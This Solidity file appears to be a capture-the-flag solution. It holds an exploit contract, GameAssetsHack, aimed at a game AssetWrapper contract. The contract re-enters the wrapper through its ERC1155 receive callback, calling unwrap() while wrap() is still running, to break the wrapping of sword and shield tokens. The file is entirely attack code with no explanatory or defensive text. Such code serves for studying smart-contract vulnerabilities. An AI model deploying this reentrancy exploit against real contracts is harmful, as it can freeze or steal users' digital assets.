pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
import "../game-assets/AssetWrapper.sol";

contract GameAssetsHack is ERC1155Receiver {
    address private nft;

    function run(
        AssetWrapper _wrapper,
        address _sword,
        address _shield
    ) external {
        run(_wrapper, 0, _sword);
        run(_wrapper, 0, _shield);
    }

    function run(
        AssetWrapper _wrapper,
        uint256 _tokenId,
        address _nft
    ) private {
        nft = _nft;
        _wrapper.wrap(_tokenId, address(this), _nft);
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4) {
        AssetWrapper(msg.sender).unwrap(address(this), nft);
        return
            bytes4(
                keccak256(
                    "onERC1155Received(address,address,uint256,uint256,bytes)"
                )
            );
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns (bytes4) {
        return bytes4(0);
    }
}
